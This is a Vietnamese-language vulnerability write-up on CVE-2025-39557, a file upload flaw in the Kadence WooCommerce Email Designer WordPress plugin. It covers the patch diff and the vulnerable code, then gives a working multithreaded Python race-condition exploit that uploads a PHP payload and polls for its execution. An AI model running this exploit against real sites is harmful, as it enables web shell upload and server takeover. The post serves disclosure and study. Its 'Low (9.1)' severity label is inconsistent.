# CVE-2025-39557 Analysis & POC


<!--more-->

## CVE & Basic Info

Lỗ hổng **Arbitrary File Upload** trong **Ben Ritner - Kadence WP Kadence WooCommerce Email Designer** cho phép **Upload một Web Shell lên Web Server**. Vấn đề này ảnh hưởng đến **Kadence WooCommerce Email Designer** từ phiên bản **không xác định cho đến 1.5.14**.

* **CVE ID**: [CVE-2025-39557](https://www.cve.org/CVERecord?id=CVE-2025-39557)
* **Vulnerability Type**: Arbitrary File Upload
* **Affected Versions**: <= 1.5.14
* **Patched Versions**: 1.5.15
* **CVSS severity**: Low (9.1)
* **Required Privilege**: Administrator
* **Product**: [WordPress Kadence WooCommerce Email Designer Plugin](https://wordpress.org/plugins/kadence-woocommerce-email-designer/)

## Requirements
* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/).
* **Plugin versions** - **Kadence WooCommerce Email Designer**: **1.5.14** (vulnerable) và **1.5.15** (patched).
* **Diff tool** - [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.
* [**WooCommerce Plugin**](https://wordpress.org/plugins/woocommerce/)

## Analysis

### Patch Diff

```php {title="class-kadence-woomail-import-export.php - v1.5.14" hl_lines=[3,4]}
static private function import_woomail( $wp_customize ) {
  ...
  $overrides = array( 'test_form' => false, 'test_type' => false, 'mimes' => array( 'dat' => 'text/plain', 'json' => 'text/plain' ) );
  $file = wp_handle_upload( $_FILES['kadence-woomail-import-file'], $overrides );
  ...
}
```

Trong phiên bản lỗi, hàm `import_woomail()` gọi đến `wp_handle_upload()` để upload file vào thư mục upload chính thức của WordPress (`wp-content/uploads/<year>/<month>/`)

> [!BUG]
> Tuy nhiên, tùy chọn `test_type => false` khiến WordPress **bỏ qua việc kiểm tra MIME Type** dựa trên whitelist hợp lệ.
> Điều này cho phép kẻ tấn công **upload các tệp nguy hiểm như web shell `.php`** lên máy chủ.

```php {title="class-kadence-woomail-import-export.php - v1.5.15" hl_lines=[3,4]}
static private function import_woomail( $wp_customize ) {
  ...
  $overrides               = array( 'test_form' => false, 'test_type' => true, 'mimes' => array( 'dat' => 'text/plain', 'json' => 'text/plain' ) );
  $file                    = wp_handle_upload( $_FILES['kadence-woomail-import-file'], $overrides );
  ...
}
```

Bản vá đã thay đổi tùy chọn `'test_type' => true` nên kích hoạt kiểm tra MIME theo whitelist, ngăn upload tệp nguy hiểm như web shell `.php`.

### Vulnerable Code 

```php {title="class-kadence-woomail-import-export.php - v1.5.14" hl_lines=[3,19,20,32,33,35,42] data-open=true}
static private function import_woomail( $wp_customize ) {
  // Make sure we have a valid nonce.
  if ( ! wp_verify_nonce( $_REQUEST['kt-woomail-import'], 'kt-woomail-importing' ) ) {
    return;
  }
  // Make sure WordPress upload support is loaded.
  if ( ! function_exists( 'wp_handle_upload' ) ) {
    require_once( ABSPATH . 'wp-admin/includes/file.php' );
  }
  // Load the export/import option class.
  require_once KT_WOOMAIL_PATH . 'includes/class-kadence-woomail-import-option.php';
  // Setup global vars.
  global $wp_customize;
  global $kt_woomail_import_error;

  // Setup internal vars.
  $kt_woomail_import_error = false;
  $template                = 'kadence-woomail-designer';
  $overrides               = array( 'test_form' => false, 'test_type' => false, 'mimes' => array( 'dat' => 'text/plain', 'json' => 'text/plain' ) );
  $file                    = wp_handle_upload( $_FILES['kadence-woomail-import-file'], $overrides );

  // Make sure we have an uploaded file.
  if ( isset( $file['error'] ) ) {
    $kt_woomail_import_error = $file['error'];
    return;
  }
  if ( ! file_exists( $file['file'] ) ) {
    $kt_woomail_import_error = __( 'Error importing settings! Please try again.', 'kadence-woocommerce-email-designer' );
    return;
  }
  // Get the upload data.
  $raw  = file_get_contents( $file['file'] );
  $data = json_decode( $raw, true );
  // Check for support of older export files. Will remove later.
  if ( ( 'array' != gettype( $data ) || ! isset( $data['template'] ) ) && version_compare( phpversion(), '7.0.0' ) >= 0  ) {
    $data = @unserialize( base64_decode( $raw ), array( 'allowed_classes' => false ) );
    if ( 'array' != gettype( $data ) || ! isset( $data['template'] ) ) {
      $data = self::mb_unserialize( $raw );
    }
  }
  // Remove the uploaded file.
  unlink( $file['file'] );
  ...
  exit;
}
```

Hàm `import_woomail()` có nhiệm vụ xử lý tải lên và nhập dữ liệu cấu hình cho plugin `Kadence WooCommerce Email Designer`, cụ thể:

1. Kiểm tra nonce để đảm bảo yêu cầu hợp lệ, tránh **CSRF attack**:

```php
if ( ! wp_verify_nonce( $_REQUEST['kt-woomail-import'], 'kt-woomail-importing' ) ) {
	return;
}
```

Khi search với từ khóa `kt-woomail-import` trong thư mục plugin

![Nonce Create](nonce_create.png "Cách nonce được tạo")

Nonce được tạo với name là `kt-woomail-import`, tức `nonce` được đặt trong mã nguồn trả về khi sử dụng chức năng của plugin, ta sử dụng chức năng này và lấy `nonce`

![Nonce Get](nonce_get.png "Cách lấy nonce trong mã nguồn trả về")

2. Thực hiện upload file bằng `wp_handle_upload()`
```php
$overrides = array( 'test_form' => false, 'test_type' => false, 'mimes' => array( 'dat' => 'text/plain', 'json' => 'text/plain' ) );
$file = wp_handle_upload( $_FILES['kadence-woomail-import-file'], $overrides );
```

Như phân tích ở trên, do triển khai lỗi nên hàm này chấp nhận upload `.php`

3. Đọc nội dung file upload, thử parse dưới dạng **JSON**.

```php
$raw  = file_get_contents( $file['file'] );
$data = json_decode( $raw, true );
```

4. Nếu không phải JSON hợp lệ → thử giải mã base64 rồi `unserialize()`

```php
if ( ( 'array' != gettype( $data ) || ! isset( $data['template'] ) ) && version_compare( phpversion(), '7.0.0' ) >= 0  ) {
	$data = @unserialize( base64_decode( $raw ), array( 'allowed_classes' => false ) );
	if ( 'array' != gettype( $data ) || ! isset( $data['template'] ) ) {
		$data = self::mb_unserialize( $raw );
	}
}
```

5. Xóa file upload khỏi server

```php
unlink( $file['file'] );
```

Ta cần quan tâm các phần sau:

{{< mermaid >}}
graph LR;
A[Upload File] --> B[Read File & Decode JSON]
B --> C{IF JSON}
C -->|True| D["unserialize()"]
D --> E["unlink()"]
{{< /mermaid >}}

File bị xóa ngay sau khi upload, nên không thể truy cập theo cách thông thường. Tận dụng khoảng thời gian giữa `Upload File` và `unlink()` để gọi file vừa upload trong khoảng thời gian đó nhằm thực thi web shell. Ta sử dụng kỹ thuật `File Upload` + `Race Condition`

---
 
```php {title="class-kadence-woomail-import-export.php - v1.5.14" hl_lines=[3,9,10] data-open=true}
static public function import_export_requests( $wp_customize ) {
  // Check if user is allowed to change values.
  if ( ! Kadence_Woomail_Designer::is_admin() ) {
    exit;
  }
  if ( isset( $_REQUEST['kt-woomail-export'] ) ) {
    self::export_woomail( $wp_customize );
  }
  if ( isset( $_REQUEST['kt-woomail-import'] ) && isset( $_FILES['kadence-woomail-import-file'] ) ) {
    self::import_woomail( $wp_customize );
  }

  if ( isset( $_REQUEST['kt-woomail-import-template'] ) ) {
    self::import_woomail_template( $wp_customize );
  }
}
```

`import_woomail()` được gọi trong hàm `import_export_requests()` nếu người dùng là `admin` và có tham số `kt-woomail-import` trong `$_REQUEST` cùng tệp tin được upload trong `$_FILES['kadence-woomail-import-file']`

Hàm `import_export_requests` được đăng ký làm callback cho action hook:

```php
add_action( 'customize_register', array( $this, 'import_export_requests' ), 999999 );
```

Tức khi sử dụng chức năng tùy chỉnh giao diện (`customize.php`) thì `import_export_requests` sẽ được gọi.

### Flow

{{< mermaid >}}
graph TD
A["Upload file via HTTP POST (kt-woomail-import + kadence-woomail-import-file)"] --> B["wp_handle_upload($_FILES['kadence-woomail-import-file'], $overrides) called"]
B --> C["File written to /wp-content/uploads/year/month/filename"]
C --> D["file_exists($file['file']) → file_get_contents($file['file'])"]
D --> E["json_decode($raw) — attempt parse as JSON"]
E --> F["If JSON invalid → base64_decode($raw) → unserialize()/mb_unserialize()"]
F --> G["Process/import template data"]
G --> H["unlink($file['file']) — delete uploaded file"]
H --> I["File removed from filesystem"]
{{< /mermaid >}}

## Exploit

### Proof of Concept (PoC)

1. Tạo script chạy song song giữ upload và đọc

```py {title="Python Script" hl_lines=[23,25,26,33,38,39,40,41,60,91,92,94,96]}
import requests
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import threading

proxies = {
    "http": "127.0.0.1:8080",
    "https": "127.0.0.1:8080"
}

headers = {
    "User-Agent": "curl/8.14.1",
    "Accept": "*/*",
    "Connection": "keep-alive",
    "Cookie": (
        "wordpress_86a9106ae65537651a8e456835b316ab=admin%7C1762274887%7Chr4bin8jsMpo40hHg8Ur3qVNiF2OrE8mhxy9mPjA4UV%7Ca49c2954010c0eed18aa2f49d261d70770dcf11a5cef221c9d43e56ed432f582; "
        "wordpress_test_cookie=WP%20Cookie%20check; "
        "wordpress_logged_in_86a9106ae65537651a8e456835b316ab=admin%7C1762274887%7Chr4bin8jsMpo40hHg8Ur3qVNiF2OrE8mhxy9mPjA4UV%7C514daa3c360a345b63ade229b137259ed3eed64ed9a7d2ac6679bb64774956be; "
        "mailpoet_subscriber=%7B%22subscriber_id%22%3A1%7D"
    )
}

php_payload = '<?php phpinfo(); ?>'

upload_url = "http://localhost/wp-admin/customize.php?kt-woomail-customize=1"
check_url = "http://localhost/wp-content/uploads/<year>/<month>/<filename>.php"

UPLOAD_THREADS = 40
CHECK_THREADS = 40

upload_success_detected = threading.Event()

def upload_worker(_):
    session = requests.Session()
    session.headers.update(headers)
    session.verify = False

    files = {
        'kt-woomail-import': (None, '5afa8d8781'),
        'kadence-woomail-import-file': ('<filename>.php', php_payload, 'application/octet-stream')
    }

    while not upload_success_detected.is_set():
        try:
            response = session.post(
                upload_url,
                files=files,
                timeout=10
            )

            ts = datetime.now().strftime("%H:%M:%S")
            if 200 <= response.status_code < 300:
                print(f"\033[92m[{ts}] [UPLOAD] Sent | 200 OK\033[0m")
            else:
                print(f"\033[93m[{ts}] [UPLOAD] Failed | {response.status_code}\033[0m")

        except Exception as e:
            print(f"\033[91m[{datetime.now().strftime('%H:%M:%S')}] [UPLOAD ERROR] {e}\033[0m")

def check_worker(_):
    session = requests.Session()
    session.proxies.update(proxies)
    session.verify = False

    while not upload_success_detected.is_set():
        try:
            response = session.get(check_url, timeout=8)

            ts = datetime.now().strftime("%H:%M:%S")
            if response.status_code == 200 and len(response.text) > 0:
                print(f"\n\033[101m[{ts}] [RCE DETECTED!] File uploaded & executed!\033[0m")
                upload_success_detected.set()
                break
            else:
                print(f"[{ts}] [CHECK] {response.status_code} | Not found yet...")

        except Exception as e:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] [CHECK ERROR] {e}")

if __name__ == "__main__":
    print("\033[96m" + "="*60)
    print("   WORDPRESS KADENCE WOOMAIL UPLOAD EXPLOIT")
    print("   Upload + Auto Check Parallel Threads")
    print("="*60 + "\033[0m")
    print(f"[*] Upload URL : {upload_url}")
    print(f"[*] Check URL  : {check_url}")
    print(f"[*] Threads    : {UPLOAD_THREADS} (upload) + {CHECK_THREADS} (check)")
    print("[*] Press Ctrl+C to stop\n")

    try:
        with ThreadPoolExecutor(max_workers=UPLOAD_THREADS + CHECK_THREADS) as executor:
            upload_futures = [executor.submit(upload_worker, i) for i in range(UPLOAD_THREADS)]
            
            check_futures = [executor.submit(check_worker, i) for i in range(CHECK_THREADS)]
            
            upload_success_detected.wait()

    except KeyboardInterrupt:
        print("\n\033[93m[!] Stopped by user.\033[0m")
    finally:
        upload_success_detected.set() 
        print("\033[91m[!] All threads terminated.\033[0m")
```

Cụ thể:
* Script này sẽ thực hiện việc đồng thời upload và check file đã upload, chỉ khi check được (`status=200`) thì mới dừng lại
* Chức năng check sẽ đi qua proxy của BurpSuite để quan sát dữ liệu trả về và filter dễ dàng qua status code.

2. Lấy cookie và nonce thêm vào script
3. Mở BurpSuite để quan sát request và response của script đi qua.
4. Chạy script

```bash 
python3 -m venv venv 
source venv/bin/active

pip install requests
python script.py
```

**Trên Terminal**:

![Result Terminal](result_terminal.png "Kết quả trên terminal")

**Trên BurpSuite**:

![Result BurpSuite](result_burp.png "Kết quả trên BurpSuite")

## Conclusion

Lỗ hổng xảy ra do plugin bỏ qua kiểm tra MIME (`test_type => false`) khi upload, cho phép tải lên file `.php`. File bị xóa ngay sau xử lý, nhưng tồn tại ngắn đủ để khai thác qua **race condition**.

## Key Takeaway

* Nguyên nhân: thiếu kiểm tra MIME + lưu file tạm trong thư mục public.
* Đã vá ở bản **1.5.15** (`test_type => true`).
* Giải pháp: luôn xác thực MIME, tránh lưu file thực thi vào thư mục public.

## References

[File Upload via Race Condition](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition)

[Arbitrary File Upload](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html)

[WordPress Kadence WooCommerce Email Designer Plugin <= 1.5.14 is vulnerable to Arbitrary File Upload](https://patchstack.com/database/wordpress/plugin/kadence-woocommerce-email-designer/vulnerability/wordpress-kadence-woocommerce-email-designer-plugin-1-5-14-arbitrary-file-upload-vulnerability) 


---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-11-08-cve-2025-39557/  

